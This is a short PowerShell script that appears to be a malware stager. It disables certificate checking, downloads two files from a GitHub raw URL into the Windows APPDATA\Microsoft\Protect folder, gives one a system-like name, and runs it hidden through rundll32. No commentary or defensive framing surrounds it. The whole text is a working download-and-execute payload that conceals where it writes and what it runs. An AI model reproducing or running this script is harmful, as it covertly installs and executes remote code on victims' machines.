[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}
$b="https://raw.githubusercontent.com/haha150/temp/main"
$wc=New-Object Net.WebClient
$p="$env:APPDATA\Microsoft\Protect"
if(!(Test-Path $p)){New-Item -ItemType Directory -Path $p -Force|Out-Null}
$wc.DownloadFile("$b/nlaapi.bin","$p\nlaapi.bin")
$d="$p\wbemcomn.dat"
$wc.DownloadFile("$b/svc.dat",$d)
Start-Process "rundll32.exe" -ArgumentList "$d,ServiceMain" -WindowStyle Hidden
